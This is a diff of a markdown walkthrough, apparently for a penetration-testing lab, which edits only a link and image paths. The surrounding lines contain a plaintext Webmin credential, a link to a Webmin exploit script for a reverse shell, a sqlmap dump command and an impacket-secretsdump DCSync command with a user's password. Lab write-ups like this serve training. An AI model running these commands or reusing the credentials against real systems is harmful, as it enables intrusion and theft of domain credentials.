@@ -192,7 +192,7 @@ Inside it can be found the credentials for webmin = admin:Password6543
 
 using the script we can get a reverse shell
 
-[https://raw.githubusercontent.com/lucas31oct/Webmin-1.910-Exploit-Script/refs/heads/stable/webmin\_exploit.py](https://raw.githubusercontent.com/lucas31oct/Webmin-1.910-Exploit-Script/refs/heads/stable/webmin\_exploit.py)
+[https://raw.githubusercontent.com/lucas31oct/Webmin-1.910-Exploit-Script/refs/heads/stable/webmin\_exploit.py](https://raw.githubusercontent.com/lucas31oct/Webmin-1.910-Exploit-Script/refs/heads/stable/webmin_exploit.py)
 
 {% code overflow="wrap" %}
 ```
@@ -244,7 +244,7 @@ SQL injection [https://www.exploit-db.com/exploits/48615](https://www.exploit-db
 sqlmap -u "http://172.16.1.12/blog/category.php?id=1*" --batch -D flag --dump
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 with
 
@@ -408,7 +408,7 @@ From bloodhound we can see that jbercov has the ability to DCSync the domain, so
 impacket-secretsdump 'dante/jbercov':myspace7@172.16.2.5
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 now we can login to the dc as administrator
 
